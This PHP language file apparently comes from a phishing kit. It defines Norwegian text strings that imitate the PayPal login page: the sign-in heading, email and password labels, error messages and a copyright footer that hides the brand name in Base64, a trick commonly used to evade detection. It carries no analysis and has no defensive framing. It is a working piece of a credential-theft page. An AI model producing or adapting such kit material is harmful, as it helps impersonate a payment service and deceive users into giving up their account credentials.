<?php
$Z118_01 = "Logg på PayPal-kontoen din";
$Z118_02 = "E-post";
$Z118_03 = "Passord";
$Z118_04 = "Det er påkrevd med en e-postadresse.";
$Z118_05 = "E-postadresse er påkrevd.";
$Z118_06 = "Logg på";
$Z118_07 = "Har du glemt e-postadressen eller passordet?";
$Z118_08 = "Opprett en konto";
$Z118_09 = "Personvern";
$Z118_10 = "PayPal";
$Z118_11 = "Copyright © 1999–<script>document.write(new Date().getFullYear());</script> <script>document.write(Base64.decode('UGF5UGFs'));</script>. Med enerett.";
$Z118_12 = "Sjekker informasjonen din.";
$Z118_13 = "Kontroller informasjonen du har oppgitt og prøv på nytt.";
?>
